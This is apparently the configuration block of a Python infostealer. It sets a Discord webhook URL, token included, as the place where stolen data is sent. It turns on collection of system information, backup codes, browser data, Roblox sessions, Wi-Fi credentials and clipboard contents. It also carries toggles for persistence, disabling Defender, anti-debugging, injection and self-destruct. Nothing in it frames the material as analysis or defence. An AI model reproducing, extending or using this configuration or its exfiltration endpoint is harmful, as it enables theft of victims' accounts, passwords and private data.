...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1191237271836442664/0YbT2x2JrcFdSsybQ2HDmrtUvGMadwtln1yjofMKZyyhXM1GR7tQFgJWMQeSOM17lGhu', 'ping': True, 'pingtype': 'Here', 'fakeerror': False, 'startup': False, 'defender': False, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': False, 'wifi': True, 'killprotector': False, 'antidebug_vm': False, 'discord': False, 'anti_spam': False, 'self_destruct': False, 'clipboard': True}
